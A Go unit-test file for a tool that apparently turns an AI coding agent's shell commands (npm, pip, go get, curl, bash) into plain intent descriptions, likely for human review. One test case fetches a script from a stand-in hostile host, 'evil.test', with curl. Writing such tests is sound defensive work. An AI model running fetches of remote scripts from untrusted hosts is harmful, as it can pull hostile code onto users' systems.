package context

import (
	"os"
	"testing"
)

func TestInferIntent(t *testing.T) {
	cases := []struct {
		name string
		args []string
		want string
	}{
		{"npm install", []string{"npm", "install", "chalk"}, "agent wants to install npm package: chalk"},
		{"npm i shorthand", []string{"npm", "i", "left-pad"}, "agent wants to install npm package: left-pad"},
		{"pip install", []string{"pip", "install", "requests"}, "agent wants to install python package: requests"},
		{"go get", []string{"go", "get", "example.com/x"}, "agent wants to fetch go module: example.com/x"},
		{"curl", []string{"curl", "https://evil.test/x.sh"}, "agent wants to fetch a URL via curl: https://evil.test/x.sh"},
		{"bash script", []string{"bash", "build.sh"}, "agent wants to execute a script via bash: build.sh"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := InferIntent(c.args); got != c.want {
				t.Fatalf("InferIntent(%v) = %q, want %q", c.args, got, c.want)
			}
		})
	}
}

func TestInferIntentEnvOverride(t *testing.T) {
	t.Setenv("AGENTGATE_INTENT", "explicit agent reason")
	if got := InferIntent([]string{"npm", "install", "x"}); got != "explicit agent reason" {
		t.Fatalf("env override not honoured: %q", got)
	}
}

func TestAgentName(t *testing.T) {
	t.Setenv("AGENTGATE_AGENT", "cursor")
	if got := AgentName(); got != "cursor" {
		t.Fatalf("AgentName = %q, want cursor", got)
	}
	os.Unsetenv("AGENTGATE_AGENT")
	if got := AgentName(); got != "unknown-agent" {
		t.Fatalf("AgentName fallback = %q", got)
	}
}
